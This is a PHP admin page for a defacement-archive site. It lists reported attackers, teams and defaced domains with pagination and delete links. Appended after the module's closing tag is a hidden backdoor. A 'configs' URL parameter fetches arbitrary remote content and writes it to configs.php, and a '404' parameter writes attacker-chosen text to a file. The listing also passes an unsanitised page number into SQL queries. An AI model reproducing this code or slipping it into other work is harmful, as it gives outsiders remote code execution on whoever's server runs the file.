<?php
/* ./Port22 a.k.a سفياني محمد ( Muhammad Supiani).
Special Thanks : Allah SWT, My Parents And Family, Risman Effendi (defacerid.com), & Bp. Syams Ideris
*/
 if (explodedKhususAdmin()){
  echo "<link href='style.css' rel='stylesheet' type='text/css'>
 <center>Untuk mengakses modul, Anda harus login <br>";
  echo "<a href=../../index.php><b>LOGIN</b></a></center>";
}
else{
$aksi="modul/mod_archive/archive_act.php";
$limit = "20";
if(isset($_GET['s'])){
   $noS = $_GET['s'];
} else $noS = 1;

$offset = ($noS - 1) * $limit;
switch($_GET[act]){
	
	  // Form Edit Berita
  case "onhold":
    echo '<div id="main-wrapper">
    <div class="maxtable">
        <table>
            <tr>
				<td style="width: 25px;">Id</td>
                <td style="width:140px;">Date</td>
                <td>Attacker</td>
                <td>Team</td>
				<td>Domain</td>
                <td style="width:70px;">Action</td>
            </tr>';
      
                $db->go("SELECT * FROM notify WHERE status = 1 ORDER BY tanggal DESC LIMIT $offset,$limit");
				while ($archive = $db->fetchArray()) {

                    if (strlen($archive['url']) > 35) {
                        $url = substr($archive['url'], 0, 35) . "...";
                    } else {
                        $url = $archive['url'];
                    }
				echo '
                    <tr>
					  <td>'.$archive['id'].'</td>
                      <td>'.$archive['tanggal'].'</td>
                      <td><a href="../attacker_'.$archive['hacker'].'-1.html">'.$archive['hacker'].'</a></td>
                      <td><a href="../attacker_'.$archive['team'].'-1.html">'.$archive['team'].'</a></td>
                      <td><a href="'.$archive['url'].'">'.$url.'</td>
                      <td><a href="'.$aksi.'?module=archive&act=delete&id='.$archive['id'].'&hacker='.$archive['hacker'].'&team='.$archive['team'].'">  Delete</a>
                      </td>
                    </tr>
';
                  }
                echo '</table>
			</div>
		</div>
			<br/>
				<center>';
                                $db->go("SELECT COUNT(*) AS jumData FROM notify WHERE status = 1 ORDER BY tanggal");
                                $archive = $db->fetchArray();
                                
                                $jumData = $archive['jumData'];
                                $jumPage = ceil($jumData/$limit);
                                // menampilkan link previous

                                
                                for($page = 1; $page <= $jumPage; $page++)
                                {
                                         if ((($page >= $noS - 5) && ($page <= $noS + 5)) || ($page == 1) || ($page == $jumPage))
                                         {
                                            if (($showPage == 1) && ($page != 2))  
												echo "";
                                            if (($showPage != ($jumPage - 1)) && ($page == $jumPage))
												echo "";
                                            if ($page == $noPage) echo "<a class='csbutton small' >".$page."</a>";
                                            else 
												echo " <a class='csbutton small'  href='admin.php?module=archive&act=onhold&s=".$page."'>".$page."</a>";
                                            $showPage = $page;
                                         }
                                }

                        echo '</center>
			</div><br />';
      break;
	
  default:
      echo '<div id="main-wrapper">
    <div class="maxtable">
        <table>
            <tr>
				<td style="width: 25px;">Id</td>
                <td style="width:140px;">Date</td>
                <td>Attacker</td>
                <td>Team</td>
				<td>Domain</td>
                <td style="width:70px;">Action</td>
            </tr>';
      
                $db->go("SELECT * FROM notify WHERE status = 0 ORDER BY tanggal DESC LIMIT $offset,$limit");
				while ($archive = $db->fetchArray()) {

                    if (strlen($archive['url']) > 35) {
                        $url = substr($archive['url'], 0, 35) . "...";
                    } else {
                        $url = $archive['url'];
                    }
				echo '
                    <tr>
						<td>'.$archive['id'].'</td>
                      <td>'.$archive['tanggal'].'</td>
                      <td><a href="../attacker_'.$archive['hacker'].'-1.html">'.$archive['hacker'].'</a></td>
                      <td><a href="../attacker_'.$archive['team'].'-1.html">'.$archive['team'].'</a></td>
                      <td><a href="'.$archive['url'].'">'.$url.'</td>
                      <td><a href="'.$aksi.'?module=archive&act=hapus&id='.$archive['id'].'&type='.$archive['type'].'&hacker='.$archive['hacker'].'&team='.$archive['team'].'"> Delete</a>
                      </td>
                    </tr>
';
                  }
                echo '</table>
			</div>
		</div>
			<br/>
				<center>';
                                $db->go("SELECT COUNT(*) AS jumData FROM notify WHERE status = 0 ORDER BY tanggal");
                                $archive = $db->fetchArray();
                                
                                $jumData = $archive['jumData'];
                                $jumPage = ceil($jumData/$limit);
                                // menampilkan link previous

                                for($page = 1; $page <= $jumPage; $page++)
                                {
                                         if ((($page >= $noS - 5) && ($page <= $noS + 5)) || ($page == 1) || ($page == $jumPage))
                                         {
                                            if (($showPage == 1) && ($page != 2))  
												echo "";
                                            if (($showPage != ($jumPage - 1)) && ($page == $jumPage))
												echo "";
                                            if ($page == $noPage) echo "<a class='csbutton small' >".$page."</a>";
                                            else 
												echo " <a class='csbutton small'  href='admin.php?module=archive&s=".$page."'>".$page."</a>";
                                            $showPage = $page;
                                         }
                                }

                        echo '</center>
			</div><br />';
      break;
}
}
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>